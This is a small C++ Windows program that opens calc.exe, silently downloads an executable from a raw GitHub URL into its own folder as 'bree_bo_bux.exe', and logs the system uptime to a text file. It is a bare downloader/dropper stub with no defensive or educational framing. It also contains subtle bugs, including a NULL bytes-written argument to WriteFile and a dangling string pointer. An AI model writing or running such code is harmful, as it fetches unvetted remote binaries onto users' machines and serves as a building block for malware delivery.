#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <iostream>


int main(int argc, char* argv[])
{
    // Execute calc.exe
    ShellExecute(NULL, "open", "C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL);

    char path[MAX_PATH]="";
    GetModuleFileName(NULL, path, MAX_PATH);
    PathRemoveFileSpec(path);

    // Create file
    HANDLE file = CreateFile((std::string(path)+"/bree_bo_bux.exe").c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    HINTERNET hInternet = InternetOpen("UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    HINTERNET hConnect = InternetOpenUrl(hInternet, "https://raw.githubusercontent.com/tankhellfire/remote/main/main.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    char buffer[1024];
    DWORD bytesRead;
    
    while (InternetReadFile(hConnect,buffer,sizeof(buffer)-1,&bytesRead)&&bytesRead!=0)
    {
        buffer[bytesRead] = '\0';
        WriteFile(file, buffer, bytesRead, NULL, NULL);
    }

    InternetCloseHandle(hConnect);

    InternetCloseHandle(hInternet);

    CloseHandle(file);

    file = CreateFile((std::string(path)+"/test.txt").c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
    const char* uptimeStr = std::to_string(GetTickCount()).c_str();
    WriteFile(file, uptimeStr, strlen(uptimeStr), NULL, NULL);
    CloseHandle(file);
}
